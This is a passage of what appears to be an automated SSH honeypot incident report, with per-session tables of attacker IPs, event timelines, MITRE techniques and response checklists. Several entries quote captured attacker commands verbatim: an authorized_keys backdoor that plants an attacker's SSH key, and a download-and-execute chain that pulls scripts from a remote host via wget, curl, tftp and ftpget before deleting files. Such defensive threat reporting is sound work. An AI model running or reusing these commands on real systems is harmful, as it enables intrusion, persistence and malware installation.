- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f1f0f1e8a34

| Field | Detail |
|---|---|
| **Source IP** | `156.225.14[.]74` |
| **First Seen** | 2026-09-29 02:17 |
| **Last Seen** | 2026-09-29 02:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 02:17:08` | `cowrie.session.connect` |
| `2026-09-29 02:17:08` | `cowrie.client.version` |
| `2026-09-29 02:17:09` | `cowrie.client.kex` |
| `2026-09-29 02:17:10` | `cowrie.login.success` |
| `2026-09-29 02:17:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.225.14[.]74` to AbuseIPDB if not already reported
- [ ] Block `156.225.14[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c9580e4fe0c

| Field | Detail |
|---|---|
| **Source IP** | `112.123.228[.]180` |
| **First Seen** | 2026-09-29 02:22 |
| **Last Seen** | 2026-09-29 02:27 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 02:22:09` | `cowrie.session.connect` |
| `2026-09-29 02:22:09` | `cowrie.client.version` |
| `2026-09-29 02:22:09` | `cowrie.client.kex` |
| `2026-09-29 02:22:10` | `cowrie.login.success` |
| `2026-09-29 02:22:11` | `cowrie.session.params` |
| `2026-09-29 02:22:11` | `cowrie.command.input` |
| `2026-09-29 02:22:11` | `cowrie.command.failed` |
| `2026-09-29 02:22:25` | `cowrie.log.closed` |
| `2026-09-29 02:27:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.123.228[.]180` to AbuseIPDB if not already reported
- [ ] Block `112.123.228[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ab8fdcd35dd

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-29 02:24 |
| **Last Seen** | 2026-09-29 02:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 02:24:28` | `cowrie.session.connect` |
| `2026-09-29 02:24:28` | `cowrie.client.version` |
| `2026-09-29 02:24:29` | `cowrie.client.kex` |
| `2026-09-29 02:24:29` | `cowrie.login.success` |
| `2026-09-29 02:24:29` | `cowrie.direct-tcpip.request` |
| `2026-09-29 02:24:29` | `cowrie.direct-tcpip.data` |
| `2026-09-29 02:24:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57675fe1828e

| Field | Detail |
|---|---|
| **Source IP** | `103.216.170[.]145` |
| **First Seen** | 2026-09-29 02:25 |
| **Last Seen** | 2026-09-29 02:25 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 02:25:46` | `cowrie.session.connect` |
| `2026-09-29 02:25:46` | `cowrie.client.version` |
| `2026-09-29 02:25:46` | `cowrie.client.kex` |
| `2026-09-29 02:25:47` | `cowrie.login.success` |
| `2026-09-29 02:25:49` | `cowrie.session.params` |
| `2026-09-29 02:25:49` | `cowrie.command.input` |
| `2026-09-29 02:25:49` | `cowrie.command.failed` |
| `2026-09-29 02:25:49` | `cowrie.log.closed` |
| `2026-09-29 02:25:50` | `cowrie.session.params` |
| `2026-09-29 02:25:50` | `cowrie.command.input` |
| `2026-09-29 02:25:50` | `cowrie.session.file_download` |
| `2026-09-29 02:25:50` | `cowrie.log.closed` |
| `2026-09-29 02:25:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.216.170[.]145` to AbuseIPDB if not already reported
- [ ] Block `103.216.170[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb7c0cda60b0

| Field | Detail |
|---|---|
| **Source IP** | `103.216.170[.]145` |
| **First Seen** | 2026-09-29 02:25 |
| **Last Seen** | 2026-09-29 02:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 02:25:51` | `cowrie.session.connect` |
| `2026-09-29 02:25:51` | `cowrie.client.version` |
| `2026-09-29 02:25:51` | `cowrie.client.kex` |
| `2026-09-29 02:25:53` | `cowrie.login.success` |
| `2026-09-29 02:25:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.216.170[.]145` to AbuseIPDB if not already reported
- [ ] Block `103.216.170[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5f472e98a94

| Field | Detail |
|---|---|
| **Source IP** | `103.216.170[.]145` |
| **First Seen** | 2026-09-29 02:25 |
| **Last Seen** | 2026-09-29 02:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 02:25:54` | `cowrie.session.connect` |
| `2026-09-29 02:25:54` | `cowrie.client.version` |
| `2026-09-29 02:25:54` | `cowrie.client.kex` |
| `2026-09-29 02:25:55` | `cowrie.login.success` |
| `2026-09-29 02:25:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.216.170[.]145` to AbuseIPDB if not already reported
- [ ] Block `103.216.170[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d42d365520b5

| Field | Detail |
|---|---|
| **Source IP** | `152.32.254[.]222` |
| **First Seen** | 2026-09-29 02:26 |
| **Last Seen** | 2026-09-29 02:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 02:26:46` | `cowrie.session.connect` |
| `2026-09-29 02:26:46` | `cowrie.client.version` |
| `2026-09-29 02:26:46` | `cowrie.client.kex` |
| `2026-09-29 02:26:47` | `cowrie.login.success` |
| `2026-09-29 02:26:48` | `cowrie.session.params` |
| `2026-09-29 02:26:48` | `cowrie.command.input` |
| `2026-09-29 02:26:48` | `cowrie.command.failed` |
| `2026-09-29 02:26:49` | `cowrie.log.closed` |
| `2026-09-29 02:26:49` | `cowrie.session.params` |
| `2026-09-29 02:26:49` | `cowrie.command.input` |
| `2026-09-29 02:26:50` | `cowrie.session.file_download` |
| `2026-09-29 02:26:50` | `cowrie.log.closed` |
| `2026-09-29 02:26:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.254[.]222` to AbuseIPDB if not already reported
- [ ] Block `152.32.254[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-704fcaf286ae

| Field | Detail |
|---|---|
| **Source IP** | `152.32.254[.]222` |
| **First Seen** | 2026-09-29 02:26 |
| **Last Seen** | 2026-09-29 02:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 02:26:50` | `cowrie.session.connect` |
| `2026-09-29 02:26:50` | `cowrie.client.version` |
| `2026-09-29 02:26:50` | `cowrie.client.kex` |
| `2026-09-29 02:26:51` | `cowrie.login.success` |
| `2026-09-29 02:26:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.254[.]222` to AbuseIPDB if not already reported
- [ ] Block `152.32.254[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd734f811bef

| Field | Detail |
|---|---|
| **Source IP** | `152.32.254[.]222` |
| **First Seen** | 2026-09-29 02:26 |
| **Last Seen** | 2026-09-29 02:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 02:26:51` | `cowrie.session.connect` |
| `2026-09-29 02:26:51` | `cowrie.client.version` |
| `2026-09-29 02:26:52` | `cowrie.client.kex` |
| `2026-09-29 02:26:53` | `cowrie.login.success` |
| `2026-09-29 02:26:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.254[.]222` to AbuseIPDB if not already reported
- [ ] Block `152.32.254[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67dccd331f47

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]69` |
| **First Seen** | 2026-09-29 02:32 |
| **Last Seen** | 2026-09-29 02:32 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; busybox wget hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; curl -o handshakebins.sh hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114[.]14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *` |
| **Download Attempts** | hxxp://213.232.114[.]14/nokillbins/handshakebins.sh, hxxp://213.232.114[.]14/nokillbins/handshakebins.sh, hxxp://213.232.114[.]14/nokillbins/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 02:32:20` | `cowrie.session.connect` |
| `2026-09-29 02:32:21` | `cowrie.login.success` |
| `2026-09-29 02:32:21` | `cowrie.session.params` |
| `2026-09-29 02:32:23` | `cowrie.command.input` |
| `2026-09-29 02:32:23` | `cowrie.command.input` |
| `2026-09-29 02:32:23` | `cowrie.session.file_download` |
| `2026-09-29 02:32:23` | `cowrie.session.file_download` |
| `2026-09-29 02:32:23` | `cowrie.session.file_download` |
| `2026-09-29 02:32:23` | `cowrie.session.file_download` |
| `2026-09-29 02:32:23` | `cowrie.session.file_download.failed` |
| `2026-09-29 02:32:24` | `cowrie.session.file_download` |
| `2026-09-29 02:32:24` | `cowrie.session.file_download` |
| `2026-09-29 02:32:38` | `cowrie.log.closed` |
| `2026-09-29 02:32:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]69` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6efdecaac84

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-09-29 02:33 |
| **Last Seen** | 2026-09-29 02:34 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 02:33:48` | `cowrie.session.connect` |
| `2026-09-29 02:33:48` | `cowrie.client.version` |
| `2026-09-29 02:33:48` | `cowrie.client.kex` |
| `2026-09-29 02:33:49` | `cowrie.login.success` |
| `2026-09-29 02:34:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6611aefeccd

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]69` |
| **First Seen** | 2026-09-29 02:41 |
| **Last Seen** | 2026-09-29 02:41 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/nokillbins/handshakebins.sh;curl -o handshakebins.sh hxxp://213.232.114[.]14/nokillbins/handshakebins.sh;busybox wget hxxp://213.232.114[.]14/nokillbins/handshakebins.sh;chmod 777 handshakebins.sh;sh handshakebins.sh;tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh;sh tftp1.sh;tftp -r tftp2.sh -g 213.232.114[.]14;chmod 777 tftp2.sh;sh tftp2.sh;ftpget -v -u anonymous -p anonymous -P 21 213.232.114[.]14 ftp1.sh ftp1.sh;sh ftp1.sh` |
| **Download Attempts** | hxxp://213.232.114[.]14/nokillbins/handshakebins.sh, hxxp://213.232.114[.]14/nokillbins/handshakebins.sh, hxxp://213.232.114[.]14/nokillbins/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 02:41:48` | `cowrie.session.connect` |
| `2026-09-29 02:41:48` | `cowrie.client.version` |
| `2026-09-29 02:41:48` | `cowrie.client.kex` |
| `2026-09-29 02:41:48` | `cowrie.login.success` |
| `2026-09-29 02:41:49` | `cowrie.session.params` |
| `2026-09-29 02:41:49` | `cowrie.command.input` |
| `2026-09-29 02:41:53` | `cowrie.session.file_download` |
| `2026-09-29 02:41:53` | `cowrie.session.file_download` |
| `2026-09-29 02:41:53` | `cowrie.session.file_download` |
| `2026-09-29 02:41:54` | `cowrie.session.file_download` |
| `2026-09-29 02:41:54` | `cowrie.session.file_download.failed` |
| `2026-09-29 02:41:56` | `cowrie.session.file_download` |
| `2026-09-29 02:41:57` | `cowrie.session.file_download` |
| `2026-09-29 02:41:59` | `cowrie.log.closed` |
| `2026-09-29 02:41:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]69` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-673b1fe44e66

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]69` |
| **First Seen** | 2026-09-29 02:41 |
| **Last Seen** | 2026-09-29 02:42 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/nokillbins/handshakebins.sh;curl -o handshakebins.sh hxxp://213.232.114[.]14/nokillbins/handshakebins.sh;busybox wget hxxp://213.232.114[.]14/nokillbins/handshakebins.sh;chmod 777 handshakebins.sh;sh handshakebins.sh;tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh;sh tftp1.sh;tftp -r tftp2.sh -g 213.232.114[.]14;chmod 777 tftp2.sh;sh tftp2.sh;ftpget -v -u anonymous -p anonymous -P 21 213.232.114[.]14 ftp1.sh ftp1.sh;sh ftp1.sh` |
| **Download Attempts** | hxxp://213.232.114[.]14/nokillbins/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 02:41:57` | `cowrie.session.connect` |
| `2026-09-29 02:41:57` | `cowrie.client.version` |
| `2026-09-29 02:41:57` | `cowrie.client.kex` |
| `2026-09-29 02:41:58` | `cowrie.login.success` |
| `2026-09-29 02:41:59` | `cowrie.session.params` |
| `2026-09-29 02:41:59` | `cowrie.command.input` |
| `2026-09-29 02:41:59` | `cowrie.session.file_download` |
| `2026-09-29 02:42:09` | `cowrie.log.closed` |
| `2026-09-29 02:42:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]69` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3db7fea9d90a

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-09-29 02:48 |
| **Last Seen** | 2026-09-29 02:49 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 02:48:53` | `cowrie.session.connect` |
| `2026-09-29 02:48:53` | `cowrie.client.version` |
| `2026-09-29 02:48:54` | `cowrie.client.kex` |
| `2026-09-29 02:48:54` | `cowrie.login.success` |
| `2026-09-29 02:48:58` | `cowrie.direct-tcpip.request` |
| `2026-09-29 02:48:59` | `cowrie.direct-tcpip.ja4` |
| `2026-09-29 02:48:59` | `cowrie.direct-tcpip.data` |
| `2026-09-29 02:49:02` | `cowrie.direct-tcpip.request` |
| `2026-09-29 02:49:02` | `cowrie.direct-tcpip.ja4` |
| `2026-09-29 02:49:02` | `cowrie.direct-tcpip.data` |
| `2026-09-29 02:49:04` | `cowrie.direct-tcpip.request` |
| `2026-09-29 02:49:05` | `cowrie.direct-tcpip.ja4` |
| `2026-09-29 02:49:05` | `cowrie.direct-tcpip.data` |
| `2026-09-29 02:49:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4669277ed01d

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-29 03:25 |
| **Last Seen** | 2026-09-29 03:25 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 03:25:45` | `cowrie.session.connect` |
| `2026-09-29 03:25:45` | `cowrie.client.version` |
| `2026-09-29 03:25:45` | `cowrie.client.kex` |
| `2026-09-29 03:25:46` | `cowrie.login.success` |
| `2026-09-29 03:25:51` | `cowrie.direct-tcpip.request` |
| `2026-09-29 03:25:51` | `cowrie.direct-tcpip.ja4` |
| `2026-09-29 03:25:51` | `cowrie.direct-tcpip.data` |
| `2026-09-29 03:25:51` | `cowrie.direct-tcpip.request` |
| `2026-09-29 03:25:55` | `cowrie.direct-tcpip.ja4` |
| `2026-09-29 03:25:55` | `cowrie.direct-tcpip.data` |
| `2026-09-29 03:25:55` | `cowrie.direct-tcpip.request` |
| `2026-09-29 03:25:55` | `cowrie.direct-tcpip.ja4` |
| `2026-09-29 03:25:55` | `cowrie.direct-tcpip.data` |
| `2026-09-29 03:25:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a585186caf2

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]118` |
| **First Seen** | 2026-09-29 03:31 |
| **Last Seen** | 2026-09-29 03:32 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 03:31:55` | `cowrie.session.connect` |
| `2026-09-29 03:31:55` | `cowrie.client.version` |
| `2026-09-29 03:31:56` | `cowrie.client.kex` |
| `2026-09-29 03:31:56` | `cowrie.login.success` |
| `2026-09-29 03:32:02` | `cowrie.direct-tcpip.request` |
| `2026-09-29 03:32:02` | `cowrie.direct-tcpip.ja4` |
| `2026-09-29 03:32:03` | `cowrie.direct-tcpip.data` |
| `2026-09-29 03:32:04` | `cowrie.direct-tcpip.request` |
| `2026-09-29 03:32:05` | `cowrie.direct-tcpip.ja4` |
| `2026-09-29 03:32:05` | `cowrie.direct-tcpip.data` |
| `2026-09-29 03:32:06` | `cowrie.direct-tcpip.request` |
| `2026-09-29 03:32:06` | `cowrie.direct-tcpip.ja4` |
| `2026-09-29 03:32:06` | `cowrie.direct-tcpip.data` |
| `2026-09-29 03:32:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]118` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]118` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d13d80f8d4aa

| Field | Detail |
|---|---|
| **Source IP** | `117.72.212[.]5` |
| **First Seen** | 2026-09-29 03:34 |
| **Last Seen** | 2026-09-29 03:39 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 03:34:09` | `cowrie.session.connect` |
| `2026-09-29 03:34:09` | `cowrie.client.version` |
| `2026-09-29 03:34:09` | `cowrie.client.kex` |
| `2026-09-29 03:34:10` | `cowrie.login.success` |
| `2026-09-29 03:34:11` | `cowrie.session.params` |
| `2026-09-29 03:34:11` | `cowrie.command.input` |
| `2026-09-29 03:34:11` | `cowrie.command.failed` |
| `2026-09-29 03:34:12` | `cowrie.log.closed` |
| `2026-09-29 03:34:13` | `cowrie.session.params` |
| `2026-09-29 03:34:13` | `cowrie.command.input` |
| `2026-09-29 03:39:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.72.212[.]5` to AbuseIPDB if not already reported
- [ ] Block `117.72.212[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa36e7a7c0f2

| Field | Detail |
|---|---|
| **Source IP** | `14.103.118[.]25` |
| **First Seen** | 2026-09-29 03:36 |
| **Last Seen** | 2026-09-29 03:41 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 03:36:14` | `cowrie.session.connect` |
| `2026-09-29 03:36:14` | `cowrie.client.version` |
| `2026-09-29 03:36:15` | `cowrie.client.kex` |
| `2026-09-29 03:36:15` | `cowrie.login.success` |
| `2026-09-29 03:36:16` | `cowrie.session.params` |
| `2026-09-29 03:36:16` | `cowrie.command.input` |
| `2026-09-29 03:36:16` | `cowrie.command.failed` |
| `2026-09-29 03:41:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.118[.]25` to AbuseIPDB if not already reported
- [ ] Block `14.103.118[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23aaed068079

| Field | Detail |
|---|---|
| **Source IP** | `14.103.118[.]25` |
| **First Seen** | 2026-09-29 03:36 |
| **Last Seen** | 2026-09-29 03:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 03:36:40` | `cowrie.session.connect` |
| `2026-09-29 03:36:40` | `cowrie.client.version` |
| `2026-09-29 03:36:41` | `cowrie.client.kex` |
| `2026-09-29 03:36:42` | `cowrie.login.success` |
| `2026-09-29 03:36:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.118[.]25` to AbuseIPDB if not already reported
- [ ] Block `14.103.118[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-448669c5c218

| Field | Detail |
|---|---|
| **Source IP** | `118.196.142[.]135` |
| **First Seen** | 2026-09-29 03:38 |
| **Last Seen** | 2026-09-29 03:43 |
| **Session Duration** | 301s |
